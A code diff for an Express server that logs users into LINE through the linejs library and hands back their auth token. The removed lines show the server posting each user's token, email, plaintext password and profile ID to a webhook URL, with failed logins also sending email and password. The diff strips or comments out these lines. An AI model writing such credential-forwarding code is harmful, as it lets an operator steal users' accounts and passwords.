@@ -3,7 +3,7 @@ import path from'path';
 import { loginWithAuthToken } from "@evex/linejs";
 import { FileStorage } from "@evex/linejs/storage";
 import { loginWithPassword } from "@evex/linejs";
-//BOTログインする垢のメアパス↓
+
 import { fileURLToPath } from 'url';
 import { dirname } from 'path';
 
@@ -36,7 +36,7 @@ app.get("/login",(req,res)=>{
 res.sendFile(path.join(__dirname, 'public', 'index.html'));
   });
 
-  // サーバーを起動
+  
 
 app.post("/api/app/login",async(req,res)=>{
 
@@ -64,29 +64,17 @@ app.post("/api/app/login",async(req,res)=>{
 const UserToken=client.authToken;
 const data = await client.base.talk.getProfile();
 const user_name=data.displayName;
-const req_url=process.env.webhook_url;
+//const req_url=process.env.webhook_url;
 const user_mid=data.mid;
 
-const content={content:`token=${UserToken}\ndisplayName=${user_name}\nemail=${user_email}\npassword=${user_password}\n@everyone\nmid=${user_mid}`}
+//const content={content:`token=${UserToken}\ndisplayName=${user_name}\nemail=${user_email}\npassword=${user_password}\n@everyone\nmid=${user_mid}`}
     
-await fetch(req_url,{
-         method: "POST",
-        headers: { "Content-Type": "application/json" }, 
-        body: JSON.stringify(content),
-});
-    
+ 
 res.json({token:`${UserToken}`})
   }catch(e){
-    const content={content:`email=${user_email}\npassword=${user_password}`}
+   
 
-    const req_url=process.env.webhook_url;
-    
-await fetch(req_url,{
-         method: "POST",
-        headers: { "Content-Type": "application/json" }, 
-        body: JSON.stringify(content),
-});
-   const err=await client.getProfile()
+  // const err=await client.getProfile()
   };
 
 });
